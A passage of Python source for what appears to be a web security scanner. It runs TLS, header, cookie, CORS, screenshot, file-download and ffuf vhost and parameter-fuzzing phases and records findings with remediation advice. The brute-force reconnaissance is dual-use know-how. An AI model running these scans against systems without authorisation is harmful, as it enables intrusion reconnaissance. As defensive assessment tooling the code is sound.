    "SSL/TLS Certificate: Expired":         (re.compile(r'expired|NOT after.*passed', re.I),  "HIGH",   ""),
}


def _phase_tls(target: dict, cfg: dict, pm: ProgressManager,
               out: OutputManager, sess: requests.Session) -> None:
    if not target["is_https"]:
        vc.log("[tls] HTTP-only target — skipping TLS phase", "WARNING")
        return
    phase     = "tls"
    hostname  = target["hostname"]
    port      = target["port"]
    host_port = f"{hostname}:{port}"
    vc.status(phase, "TLS Analysis", "running", "sslscan", 0, 4)

    sslscan = _find_tool("sslscan")
    if sslscan:
        out_f = out.output_path(phase, f"sslscan_{hostname}_{port}")
        cmd   = [sslscan, "--no-colour", host_port]
        vc.log(f"[tls] Running sslscan on {host_port}", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            stdout, _ = proc.communicate(timeout=120)
            _deregister_proc(proc)
            out_f.write_text(stdout, encoding="utf-8")
            out.log_command("sslscan", cmd, out_f)
            # Filter "not vulnerable" lines and bare section headers.
            # sslscan emits lines like "  Heartbleed:" (header only, no result)
            # followed by per-protocol result lines. The header line survives a
            # "not vulnerable" filter and falsely matches heartbleed patterns.
            _SSL_SECTION_HDR = re.compile(r'^\s+[\w ,()/-]+:\s*$')
            _sslscan_filtered = "\n".join(
                ln for ln in stdout.splitlines()
                if "not vulnerable" not in ln.lower()
                and not _SSL_SECTION_HDR.match(ln)
            )
            for ftitle, (pat, risk, cve) in _TLS_VULN_PATTERNS.items():
                if pat.search(_sslscan_filtered):
                    out.add_finding(
                        title=ftitle, url=target["url"], port=port,
                        risk=risk, description=f"TLS issue: {ftitle}",
                        cves=cve, sources="sslscan", service="https",
                        output_file=str(out_f),
                        owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                        remediation="Disable weak protocols/ciphers. Use TLS 1.2/1.3 with AEAD ciphers.",
                    )
        except Exception as e:
            out.log_error("sslscan", cmd, str(e))
    else:
        vc.error("[tls] sslscan not found — install sslscan for full TLS analysis",
                 source="tls", category="Tool")

    vc.status(phase, "TLS Analysis", "running", "testssl.sh", 2, 4)
    testssl = _find_tool("testssl.sh") or _find_tool("testssl")
    if testssl:
        out_f = out.output_path(phase, f"testssl_{hostname}_{port}")
        cmd   = [testssl, "--color", "0", "--quiet", "--severity", "LOW", target["url"]]
        vc.log(f"[tls] Running testssl.sh on {host_port}", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            stdout, _ = proc.communicate(timeout=300)
            _deregister_proc(proc)
            out_f.write_text(stdout, encoding="utf-8")
            out.log_command("testssl.sh", cmd, out_f)
            # Filter out (OK) lines, noise lines, and embedded HTTP content
            # that can cause false-positive pattern matches.
            _TESTSSL_NOISE = re.compile(
                r'Testing robust forward secrecy'
                r'|User-agent:'
                r'|Disallow:'
                r'|not offered',   # cipher/protocol absent → never a finding
                re.I,
            )
            _ok_filtered = "\n".join(
                ln for ln in stdout.splitlines()
                if "(OK)" not in ln and not _TESTSSL_NOISE.search(ln)
            )
            for ftitle, (pat, risk, cve) in _TLS_VULN_PATTERNS.items():
                if pat.search(_ok_filtered):
                    out.add_finding(
                        title=ftitle, url=target["url"], port=port,
                        risk=risk, description=f"TLS issue: {ftitle}",
                        cves=cve, sources="testssl.sh", service="https",
                        output_file=str(out_f),
                        owasp="A02", nist="SC-8",
                        remediation="Disable weak protocols. Enable TLS 1.2/1.3 only.",
                    )
            # Detect missing security headers reported by testssl
            _TESTSSL_HDR_RISK = {
                "Strict-Transport-Security": "MEDIUM",
                "Content-Security-Policy":   "MEDIUM",
                "X-Frame-Options":           "MEDIUM",
                "X-Content-Type-Options":    "LOW",
                "Referrer-Policy":           "LOW",
                "Permissions-Policy":        "LOW",
                "X-XSS-Protection":          "LOW",
            }
            for _hdr, _hr in _TESTSSL_HDR_RISK.items():
                if re.search(rf'{re.escape(_hdr)}\s+not offered', stdout, re.I):
                    out.add_finding(
                        title=f"Missing Security Header: {_hdr}",
                        url=target["url"], port=port, risk=_hr,
                        description=f"The security header '{_hdr}' is not present.",
                        output=f"Missing: {_hdr}",
                        affected=_hdr,
                        sources="testssl.sh", service="https",
                        output_file=str(out_f),
                        owasp="A05", nist="SC-8",
                        remediation=f"Add the '{_hdr}' HTTP response header.",
                    )
        except Exception as e:
            out.log_error("testssl.sh", cmd, str(e))
    else:
        vc.log("[tls] testssl.sh not found — basic socket TLS check", "WARNING")
        import ssl as _ssl
        try:
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            with ctx.wrap_socket(
                socket.create_connection((hostname, port), timeout=10),
                server_hostname=hostname
            ) as s:
                proto = s.version()
            # Informational: record negotiated TLS version
            if proto:
                out.add_finding(
                    title="TLS Version Identified",
                    url=target["url"], port=port, risk="INFO",
                    description=f"Server negotiated {proto}.",
                    output=f"Negotiated protocol: {proto}",
                    sources="fracture-tls-socket", service="https",
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="",
                )
            if proto in ("TLSv1", "TLSv1.1", "SSLv2", "SSLv3"):
                out.add_finding(
                    title=f"{proto} Enabled",
                    url=target["url"], port=port,
                    risk="MEDIUM" if "1.1" in (proto or "") else "HIGH",
                    description=f"Server negotiated {proto} which is considered weak.",
                    sources="fracture-tls-socket", service="https",
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="Configure TLS 1.2/1.3 only.",
                )
        except Exception:
            pass

    vc.status(phase, "TLS Analysis", "complete", "Done", 4, 4)
    vc.log("[tls] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 2: Headers
# ─────────────────────────────────────────────
_SECURITY_HEADERS = [
    ("Strict-Transport-Security", "HIGH",   "Missing HSTS Header",
     "Without HSTS, browsers may connect over plain HTTP enabling SSL-stripping downgrade attacks (RFC 6797). CWE-523, CWE-319.",
     "SC-8", "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
    ("Content-Security-Policy",   "MEDIUM", "Missing Content-Security-Policy Header",
     "Without CSP, the application is susceptible to XSS attacks.",
     "SI-10", "Implement a Content-Security-Policy to restrict resource loading."),
    ("X-Frame-Options",           "MEDIUM", "Missing X-Frame-Options Header (Clickjacking)",
     "Without X-Frame-Options, the page may be embedded in an iframe for clickjacking.",
     "SI-10", "Add: X-Frame-Options: DENY or SAMEORIGIN"),
    ("X-Content-Type-Options",    "LOW",    "Missing X-Content-Type-Options Header",
     "Without this header, browsers may MIME-sniff responses enabling XSS.",
     "SI-10", "Add: X-Content-Type-Options: nosniff"),
    ("Referrer-Policy",           "LOW",    "Missing Referrer-Policy Header",
     "Without Referrer-Policy, URL parameters may leak to third parties.",
     "SI-12", "Add: Referrer-Policy: strict-origin-when-cross-origin"),
    ("Permissions-Policy",        "LOW",    "Missing Permissions-Policy Header",
     "Without Permissions-Policy, browser features may be accessible unintentionally.",
     "CM-7",  "Add: Permissions-Policy: geolocation=(), camera=(), microphone=()"),
    ("X-XSS-Protection",          "LOW",    "Missing X-XSS-Protection Header",
     "Without X-XSS-Protection, older browsers lack an extra XSS filter hint.",
     "SI-10", "Add: X-XSS-Protection: 1; mode=block"),
]


def _phase_headers(target: dict, cfg: dict, pm: ProgressManager,
                   out: OutputManager, sess: requests.Session) -> None:
    phase   = "headers"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "Security Headers", "running", "Fetching headers", 0, 5)

    try:
        resp    = sess.get(url, timeout=timeout, allow_redirects=True)
        headers = resp.headers
    except Exception as e:
        vc.log(f"[headers] Could not fetch {url}: {e}", "ERROR")
        return

    out_f = out.output_path(phase, "headers_" + target["hostname"])
    out_f.write_text(
        "\n".join(f"{k}: {v}" for k, v in headers.items()), encoding="utf-8"
    )

    # Informational findings — record technology/server info observed on target
    server_hdr = headers.get("Server", "")
    if server_hdr:
        out.add_finding(
            title="Web Server Identified",
            url=url, port=target["port"], risk="INFO",
            description=f"The target is running {server_hdr}. Server version banners "
                        "may assist attackers in fingerprinting known vulnerabilities.",
            output=f"Server: {server_hdr}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation="Configure the web server to suppress or genericise the Server header.",
        )
    powered_by = headers.get("X-Powered-By", "")
    if powered_by:
        out.add_finding(
            title="Technology Stack Identified",
            url=url, port=target["port"], risk="INFO",
            description=f"The X-Powered-By header reveals the technology stack: {powered_by}.",
            output=f"X-Powered-By: {powered_by}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation="Remove the X-Powered-By header to limit technology fingerprinting.",
        )

    vc.status(phase, "Security Headers", "running", "Security header check", 1, 5)

    is_https = target["is_https"]
    for hdr_name, risk, _unused_title, desc, nist_ctrl, remed in _SECURITY_HEADERS:
        if hdr_name == "Strict-Transport-Security" and not is_https:
            continue
        if hdr_name not in headers:
            out.add_finding(
                title=f"Missing Security Header: {hdr_name}",
                url=url, port=target["port"], risk=risk,
                description=desc, sources="fracture-headers",
                service=target["scheme"], output_file=str(out_f),
                owasp="A05", nist=nist_ctrl, remediation=remed,
                output=f"Missing: {hdr_name}",
                affected=hdr_name,
            )

    vc.status(phase, "Security Headers", "running", "CORS check", 2, 5)
    acao = headers.get("Access-Control-Allow-Origin", "")
    acac = headers.get("Access-Control-Allow-Credentials", "")
    if acao == "*" and acac.lower() == "true":
        out.add_finding(
            title="CORS Misconfiguration: Wildcard with Credentials",
            url=url, port=target["port"], risk="HIGH",
            description="Access-Control-Allow-Origin: * combined with Allow-Credentials: true allows any origin to make credentialed requests.",
            output=f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
            sources="fracture-headers", service=target["scheme"],
            owasp="A05:2025 Security Misconfiguration", nist="AC-4",
            remediation="Specify explicit allowed origins instead of wildcard when using credentials.",
        )

    vc.status(phase, "Security Headers", "running", "Cookie flags", 3, 5)
    # Parse raw Set-Cookie headers
    raw_sc = headers.get("Set-Cookie", "")
    sc_list = [raw_sc] if raw_sc else []
    # Try to get multiple Set-Cookie via requests internals
    try:
        all_sc = resp.raw.headers.getlist("Set-Cookie")
        if all_sc:
            sc_list = all_sc
    except Exception:
        pass

    for sc in sc_list:
        if not sc:
            continue
        sc_lower = sc.lower()
        cname    = sc.split("=")[0].strip() if "=" in sc else sc.split(";")[0].strip()
        if "httponly" not in sc_lower:
            out.add_finding(
                title="Cookie Missing HttpOnly Flag",
                url=url, port=target["port"], risk="MEDIUM",
                description=f"Cookie '{cname}' is set without HttpOnly, making it accessible to JavaScript.",
                output=f"Set-Cookie: {sc[:200]}",
                sources="fracture-headers", service=target["scheme"],
                owasp="A05:2025 Security Misconfiguration", nist="SC-23",
                remediation="Add HttpOnly attribute to all session cookies.",
            )
        if is_https and "secure" not in sc_lower:
            out.add_finding(
                title="Cookie Missing Secure Flag",
                url=url, port=target["port"], risk="MEDIUM",
                description=f"Cookie '{cname}' is missing the Secure flag.",
                output=f"Set-Cookie: {sc[:200]}",
                sources="fracture-headers", service=target["scheme"],
                owasp="A05:2025 Security Misconfiguration", nist="SC-23",
                remediation="Add Secure attribute to all cookies on HTTPS sites.",
            )
        if "samesite" not in sc_lower:
            out.add_finding(
                title="Cookie Missing SameSite Attribute",
                url=url, port=target["port"], risk="LOW",
                description=f"Cookie '{cname}' does not have the SameSite attribute.",
                output=f"Set-Cookie: {sc[:200]}",
                sources="fracture-headers", service=target["scheme"],
                owasp="A05:2025 Security Misconfiguration", nist="SC-23",
                remediation="Add SameSite=Lax or SameSite=Strict to all cookies.",
            )

    vc.status(phase, "Security Headers", "complete", "Done", 5, 5)
    vc.log("[headers] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 2b: shcheck
# ─────────────────────────────────────────────

def _phase_shcheck(target: dict, cfg: dict, pm: ProgressManager,
                   out: OutputManager, sess: requests.Session,
                   extra_urls: "list | None" = None) -> None:
    """Run shcheck against the target URL (and any extra URLs) to detect missing
    HTTP security response headers.

    Findings:
      - "Missing Security Header: <name>" — MEDIUM for HSTS, LOW for all others
    Output saved to: headers/shcheck_<hostname>_<port>.txt
    SSL error retry: if shcheck bails on TLS validation, retried with -d flag.
    """
    phase   = "shcheck"
    timeout = cfg.get("timeout", 10) + 20   # shcheck needs a little more time

    shcheck = _find_shcheck()
    if not shcheck:
        vc.log("[shcheck] shcheck not found — skipping", "WARNING")
        return

    _HSTS = "Strict-Transport-Security"
    targets_to_scan = [target]
    if extra_urls:
        for eu in extra_urls:
            try:
                targets_to_scan.append(_parse_target(eu))
            except Exception:
                pass

    vc.status(phase, "shcheck", "running", "Security header check", 0, len(targets_to_scan))

    for i, tgt in enumerate(targets_to_scan):
        tgt_url  = tgt["url"]
        hostname = tgt["hostname"]
        port     = tgt["port"]
        safe_host = hostname.replace(".", "_")
        out_f    = out.output_path("headers", f"shcheck_{safe_host}_{port}")

        # Build command: python3 path/to/shcheck.py if it's a .py script
        _flags = ["-k", "--colors=none", "-j"]
        if shcheck.endswith(".py"):
            cmd = [sys.executable, shcheck] + _flags + [tgt_url]
        else:
            cmd = [shcheck] + _flags + [tgt_url]

        vc.log(f"[shcheck] Running on {tgt_url}", "INFO")
        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=timeout, errors="replace",
            )
            combined = proc.stdout + (proc.stderr or "")
            out.log_command("shcheck", cmd, out_f)

            # Retry with -d if SSL validation error produced no results
            _ssl_err = "SSL: Certificate validation error." in combined
            _no_data = "set()" in combined or not any(
                kw in combined for kw in ("missing", "Missing", "[!]", '"missing"')
            )
            if _ssl_err and _no_data:
                vc.log(f"[shcheck] SSL error — retrying with -d on {hostname}:{port}", "WARNING")
                cmd_d = list(cmd)
                cmd_d.insert(-1, "-d")
                try:
                    proc_d   = subprocess.run(
                        cmd_d, capture_output=True, text=True,
                        timeout=timeout, errors="replace",
                    )
                    combined = proc_d.stdout + (proc_d.stderr or "")
                    proc     = proc_d
                    out.log_command("shcheck", cmd_d, out_f)
                except (subprocess.TimeoutExpired, OSError):
                    pass

            out_f.write_text(combined, encoding="utf-8", errors="replace")

        except subprocess.TimeoutExpired:
            vc.log(f"[shcheck] Timed out on {hostname}:{port}", "WARNING")
            out_f.write_text(f"(shcheck timed out after {timeout}s)", encoding="utf-8")
            vc.status(phase, "shcheck", "running", "Scanning", i + 1, len(targets_to_scan))
            continue
        except OSError as exc:
            vc.log(f"[shcheck] Launch error on {hostname}:{port}: {exc}", "ERROR")
            vc.status(phase, "shcheck", "running", "Scanning", i + 1, len(targets_to_scan))
            continue

        # ── Parse JSON output ─────────────────────────────────────────────
        stdout_text = proc.stdout or ""
        _json_parsed = False
        try:
            shcheck_json = json.loads(stdout_text)
            if isinstance(shcheck_json, dict):
                # shcheck -j has two output formats depending on version:
                #   newer: {"missing": [...], "present": [...]}  (flat, root-level)
                #   older: {"http://url/": {"missing": [...], "present": [...]}}
                _inner = shcheck_json
                if "missing" not in shcheck_json:
                    # URL-keyed format — take the first value that is a dict
                    for _v in shcheck_json.values():
                        if isinstance(_v, dict) and "missing" in _v:
                            _inner = _v
                            break
                missing_headers = _inner.get("missing") or []
                if not isinstance(missing_headers, list):
                    missing_headers = []
                for hdr in missing_headers:
                    hdr = str(hdr).strip()
                    if not hdr:
                        continue
                    if hdr == _HSTS and not tgt["is_https"]:
                        continue   # HSTS only applies to HTTPS
                    risk = "MEDIUM" if hdr == _HSTS else "LOW"
                    out.add_finding(
                        title=f"Missing Security Header: {hdr}",
                        url=tgt_url, port=port, risk=risk,
                        description=(
                            f"The HTTP security header '{hdr}' is absent from the "
                            f"response at {tgt_url}."
                        ),
                        output=f"Missing: {hdr}",
                        sources="shcheck", service=tgt["scheme"],
                        output_file=str(out_f),
                        affected=hdr,
                        owasp="A05:2025 Security Misconfiguration", nist="SC-8",
                        remediation=f"Add the '{hdr}' header to all HTTP responses.",
                    )
                    vc.log(f"[shcheck] Missing: {hdr} ({risk}) on {hostname}:{port}", "SUCCESS")
                _json_parsed = True
        except (json.JSONDecodeError, Exception):
            pass

        # ── Text-format fallback ──────────────────────────────────────────
        if not _json_parsed:
            for line in stdout_text.splitlines():
                line = line.strip()
                m = re.match(r'^\[!\]\s+Missing\s+security\s+header:\s+(\S+)', line)
                if not m:
                    m = re.match(
                        r'^\[!\]\s+(?:The\s+)?[Hh]eader\s+[\'"]?([A-Za-z0-9_-]+)[\'"]?\s+is\s+missing',
                        line,
                    )
                if not m:
                    continue
                hdr = m.group(1).strip()
                if hdr == _HSTS and not tgt["is_https"]:
                    continue
                risk = "MEDIUM" if hdr == _HSTS else "LOW"
                out.add_finding(
                    title=f"Missing Security Header: {hdr}",
                    url=tgt_url, port=port, risk=risk,
                    description=(
                        f"The HTTP security header '{hdr}' is absent from the "
                        f"response at {tgt_url}."
                    ),
                    output=line,
                    sources="shcheck", service=tgt["scheme"],
                    output_file=str(out_f),
                    affected=hdr,
                    owasp="A05:2025 Security Misconfiguration", nist="SC-8",
                    remediation=f"Add the '{hdr}' header to all HTTP responses.",
                )
                vc.log(f"[shcheck] Missing: {hdr} ({risk}) on {hostname}:{port}", "SUCCESS")

        vc.status(phase, "shcheck", "running", "Scanning", i + 1, len(targets_to_scan))

    vc.status(phase, "shcheck", "complete", "Done", len(targets_to_scan), len(targets_to_scan))
    vc.log("[shcheck] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 0b: Screenshot
# ─────────────────────────────────────────────

def _phase_screenshot(target: dict, cfg: dict, pm: ProgressManager,
                      out: OutputManager) -> None:
    """Capture a screenshot of the target URL using headless Chrome via Selenium.

    Saved to: recon/screenshot_<hostname>_<port>.png
    Creates an INFO finding "Web Screenshot Captured" with output_file pointing
    to the PNG so it can be viewed via Crucible's Evidence tab.
    """
    phase    = "screenshot"
    url      = target["url"]
    hostname = target["hostname"]
    port     = target["port"]

    if not _check_selenium():
        vc.log("[screenshot] selenium not available — skipping", "WARNING")
        return

    vc.status(phase, "Screenshot", "running", "Launching browser", 0, 1)

    save_dir  = out.root / "recon"
    save_dir.mkdir(parents=True, exist_ok=True)
    safe_host = hostname.replace(".", "_")
    out_path  = save_dir / f"screenshot_{safe_host}_{port}.png"

    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options

        opts = Options()
        opts.add_argument("--headless=new")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--ignore-certificate-errors")
        opts.add_argument("--allow-insecure-localhost")
        opts.add_argument("--window-size=1280,800")
        opts.add_experimental_option("excludeSwitches", ["enable-logging"])
        chrome_bin = _find_chrome_binary()
        if chrome_bin:
            opts.binary_location = chrome_bin
        # Resolve IP for --host-resolver-rules (enables SNI virtual host rendering)
        _ip = target.get("ip")
        if not _ip:
            try:
                _ip = socket.gethostbyname(hostname)
            except Exception:
                _ip = None
        if hostname and _ip and _ip != hostname:
            opts.add_argument(f"--host-resolver-rules=MAP {hostname} {_ip}")

        svc    = _build_chrome_service()
        driver = webdriver.Chrome(service=svc, options=opts)
        try:
            driver.set_page_load_timeout(15)
            try:
                driver.get(url)
            except Exception:
                pass
            total_h = driver.execute_script(
                "return Math.max("
                "  document.body.scrollHeight,"
                "  document.documentElement.scrollHeight"
                ")"
            )
            driver.set_window_size(1280, max(800, int(total_h)))
            driver.save_screenshot(str(out_path))
        finally:
            try:
                driver.quit()
            except Exception:
                pass

        out.add_finding(
            title="Web Screenshot Captured",
            url=url, port=port, risk="INFO",
            description=f"A screenshot of {url} was captured during reconnaissance.",
            output=f"Saved: {out_path.name}",
            sources="fracture-screenshot", service=target["scheme"],
            output_file=str(out_path),
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation="Review screenshot for exposed sensitive content.",
        )
        vc.log(f"[screenshot] Saved: {out_path}", "SUCCESS")

    except Exception as exc:
        vc.log(f"[screenshot] Failed: {type(exc).__name__}: {exc}", "WARNING")

    vc.status(phase, "Screenshot", "complete", "Done", 1, 1)
    vc.log("[screenshot] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 0c: Web file download
# ─────────────────────────────────────────────

def _web_path_to_filename(path: str) -> str:
    """Convert a URL path to a safe flat filename, preserving file extension."""
    path = path.split("?")[0].strip("/")
    name = path.replace("/", "__") or "index"
    if "." not in name.rsplit("/", 1)[-1]:
        name += ".html"
    return _RE_UNSAFE_FNAME.sub("_", name)[:200]


def _phase_webfiles(target: dict, cfg: dict, pm: ProgressManager,
                    out: OutputManager, sess: requests.Session) -> None:
    """Download well-known web files and linked HTML/PHP files from the target.

    Strategy:
    1. Fetch each path in _WEB_WELL_KNOWN.
    2. Parse the index page for href/src links with recognised extensions.
    3. Download up to _MAX_WEB_LINKS additional same-host files.
    Deduplication via SHA-256 body hash prevents saving identical 404 pages.

    Files saved to: recon/web/<hostname>_<port>/
    Creates an INFO finding listing all downloaded files.
    """
    phase    = "webfiles"
    url      = target["url"]
    hostname = target["hostname"]
    port     = target["port"]
    timeout  = cfg.get("timeout", 10)

    save_dir = out.root / "recon" / "web" / f"{hostname}_{port}"
    save_dir.mkdir(parents=True, exist_ok=True)

    base_url     = url.rstrip("/")
    visited:     set   = set()
    seen_hashes: set   = set()
    to_fetch:    list  = list(_WEB_WELL_KNOWN)
    saved:       list  = []

    vc.status(phase, "Web Files", "running", "Downloading", 0, len(_WEB_WELL_KNOWN))

    def _get_and_save(path: str) -> "str | None":
        if path in visited:
            return None
        visited.add(path)
        furl = base_url + path if path.startswith("/") else path
        try:
            r    = sess.get(furl, timeout=timeout, stream=True, allow_redirects=True)
            body = b""
            for chunk in r.iter_content(8192):
                body += chunk
                if len(body) >= _MAX_FILE_BYTES:
                    break
            digest = hashlib.sha256(body).hexdigest()
            if digest in seen_hashes:
                return None
            seen_hashes.add(digest)
            text  = body.decode("utf-8", errors="replace")
            fname = _web_path_to_filename(path)
            fpath = save_dir / fname
            fpath.write_text(text, encoding="utf-8")
            return str(fpath)
        except Exception:
            return None

    for path in _WEB_WELL_KNOWN:
        fpath = _get_and_save(path)
        if fpath:
            saved.append(fpath)
            if path in ("/", "/index.html", "/index.php"):
                try:
                    text = Path(fpath).read_text(encoding="utf-8", errors="replace")
                    for m in re.finditer(
                        r'(?:href|src)=["\']([^"\'>\s]+)["\']', text, re.IGNORECASE
                    ):
                        href = m.group(1)
                        if not any(href.lower().endswith(ext) for ext in _WEB_EXTS):
                            continue
                        if href.startswith("http"):
                            if f"{hostname}" in href or f"{hostname}:{port}" in href:
                                after = re.sub(r"^https?://[^/]+", "", href)
                                to_fetch.append(after or "/")
                        else:
                            to_fetch.append(href if href.startswith("/") else "/" + href)
                except Exception:
                    pass

    for path in to_fetch:
        if path in _WEB_WELL_KNOWN:
            continue
        if len(saved) >= _MAX_WEB_LINKS:
            break
        fpath = _get_and_save(path)
        if fpath:
            saved.append(fpath)

    vc.status(phase, "Web Files", "running", f"{len(saved)} files", len(saved), max(len(saved), 1))

    if saved:
        out.add_finding(
            title="Web Files Downloaded",
            url=url, port=port, risk="INFO",
            description=(
                f"{len(saved)} file(s) downloaded from {url} during reconnaissance. "
                "Review for sensitive content."
            ),
            output="\n".join(Path(f).name for f in saved[:20]),
            sources="fracture-webfiles", service=target["scheme"],
            output_file=",".join(saved[:20]),
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation="Review downloaded files for sensitive information or misconfigurations.",
        )
        vc.log(f"[webfiles] {len(saved)} files saved to {save_dir}", "SUCCESS")

    vc.status(phase, "Web Files", "complete", "Done", len(saved), max(len(saved), 1))
    vc.log("[webfiles] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 2c: ffuf — virtual host & parameter fuzzing
# ─────────────────────────────────────────────

def _phase_ffuf(target: dict, cfg: dict, pm: ProgressManager,
                out: OutputManager, sess: requests.Session) -> None:
    """Run ffuf for virtual host discovery and URL parameter brute-forcing.

    Virtual host discovery:
      - Fuzzes Host header using a DNS subdomain wordlist.
      - Filters responses whose content-length matches the baseline (same server
        answering every request) to suppress false positives.
      - Findings: "Virtual Host Discovered: <vhost>.<host>" (LOW)

    Parameter discovery:
      - Fuzzes GET parameters on the target URL to discover hidden params that
        elicit a different response (size or status change vs baseline).
      - Findings: "Hidden Parameter Discovered: <param>" (LOW)

    Output saved to ffuf/ subdirectory.
    """
    phase  = "ffuf"
    url    = target["url"]
    host   = target["hostname"]
    port   = target["port"]
    timeout = cfg.get("timeout", 10)

    ffuf = _find_tool("ffuf")
    if not ffuf:
        vc.log("[ffuf] ffuf not found — skipping", "WARNING")
        return

    vhost_wl = _find_wordlist(
        "Discovery/DNS/namelist.txt",
        cfg.get("ffuf_vhost_wordlist", ""),
    )
    param_wl = _find_wordlist(
        "Discovery/Web-Content/burp-parameter-names.txt",
        cfg.get("ffuf_param_wordlist", ""),
    )

    ffuf_dir = out.root / "ffuf"
    ffuf_dir.mkdir(exist_ok=True)

    # ── 1. Virtual host discovery ─────────────────────────────────────────────
    vc.status(phase, "ffuf", "running", "vhost discovery", 0, 2)
    if Path(vhost_wl).exists():
        # Baseline: request with an obviously bogus vhost to get the default response size
        _baseline_len = 0
        _baseline_code = 200
        try:
            _bl_r = sess.get(url, timeout=timeout,
                             headers={"Host": f"_fracture_baseline_nxdomain_.{host}"})
            _baseline_len  = len(_bl_r.content)
            _baseline_code = _bl_r.status_code
        except Exception:
            pass

        vhost_out = ffuf_dir / f"vhost_{host}_{port}.json"
        cmd = [
            ffuf, "-w", vhost_wl,
            "-u", url,
            "-H", f"Host: FUZZ.{host}",
            "-mc", "200,201,204,301,302,307,401,403",
            "-fs", str(_baseline_len),
            "-s",
            "-json", "-o", str(vhost_out),
            "-t", "40",
            "-timeout", str(timeout),
        ]
        vc.log(f"[ffuf] vhost discovery on {host} (baseline_len={_baseline_len})", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            proc.communicate(timeout=180)
            _deregister_proc(proc)
            out.log_command("ffuf", cmd, vhost_out)
            if vhost_out.exists():
                try:
                    ffuf_data = json.loads(vhost_out.read_text(encoding="utf-8"))
                    for result in ffuf_data.get("results", []):
                        vhost_word = result.get("input", {}).get("FUZZ", "").strip()
                        status     = result.get("status", 0)
                        resp_len   = result.get("length", 0)
                        if not vhost_word:
                            continue
                        full_vhost = f"{vhost_word}.{host}"
                        out.add_finding(
                            title=f"Virtual Host Discovered: {full_vhost}",
                            url=url, port=port, risk="LOW",
                            description=(
                                f"ffuf discovered virtual host '{full_vhost}' (HTTP {status}, "
                                f"{resp_len} bytes). The host header was fuzzed against {url}."
                            ),
                            output=f"Host: {full_vhost}\nStatus: {status}\nLength: {resp_len}",
                            sources="ffuf", service=target["scheme"],
                            output_file=str(vhost_out),
                            affected=full_vhost,
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation=(
                                "Review virtual host configuration. Ensure unintended vhosts "
                                "are not accessible or are properly access-controlled."
                            ),
                        )
                        vc.log(f"[ffuf] vhost: {full_vhost} → {status}", "SUCCESS")
                except Exception:
                    pass
        except Exception as e:
            out.log_error("ffuf-vhost", cmd, str(e))
    else:
        vc.log(f"[ffuf] vhost wordlist not found: {vhost_wl} — skipping vhost fuzz", "WARNING")

    # ── 2. Parameter discovery ────────────────────────────────────────────────
    vc.status(phase, "ffuf", "running", "param discovery", 1, 2)
    if Path(param_wl).exists():
        # Baseline response for an obviously invalid parameter
        _p_baseline_len = 0
        try:
            _p_bl = sess.get(url, params={"_fracture_noparam_": "1"}, timeout=timeout)
            _p_baseline_len = len(_p_bl.content)
        except Exception:
            pass

        param_out = ffuf_dir / f"params_{host}_{port}.json"
        cmd = [
            ffuf, "-w", param_wl,
            "-u", f"{url}?FUZZ=fractureval",
            "-mc", "200,201",
            "-fs", str(_p_baseline_len),
            "-s",
            "-json", "-o", str(param_out),
            "-t", "40",
            "-timeout", str(timeout),
        ]
        vc.log(f"[ffuf] param discovery on {url}", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            proc.communicate(timeout=180)
            _deregister_proc(proc)
            out.log_command("ffuf", cmd, param_out)
            if param_out.exists():
                try:
                    ffuf_data = json.loads(param_out.read_text(encoding="utf-8"))
                    for result in ffuf_data.get("results", []):
                        param = result.get("input", {}).get("FUZZ", "").strip()
                        status = result.get("status", 0)
                        rlen   = result.get("length", 0)
                        if not param:
                            continue
                        out.add_finding(
                            title=f"Hidden Parameter Discovered: {param}",
                            url=url, port=port, risk="LOW",
                            description=(
                                f"ffuf discovered undocumented GET parameter '{param}' at "
                                f"{url} (HTTP {status}, {rlen} bytes response)."
                            ),
                            output=f"Parameter: {param}\nURL: {url}?{param}=...\nStatus: {status}",
                            sources="ffuf", service=target["scheme"],
                            output_file=str(param_out),
                            affected=f"{url}?{param}=",
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation=(
                                "Review undocumented parameters for unintended functionality "
                                "or access control bypass opportunities."
                            ),
                        )
                        vc.log(f"[ffuf] param: {param} → {status}", "SUCCESS")
                except Exception:
                    pass
        except Exception as e:
            out.log_error("ffuf-params", cmd, str(e))
    else:
        vc.log(f"[ffuf] param wordlist not found: {param_wl} — skipping param fuzz", "WARNING")

    vc.status(phase, "ffuf", "complete", "Done", 2, 2)
    vc.log("[ffuf] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 3: Crawl
# ─────────────────────────────────────────────
_SECRET_PATTERNS = [
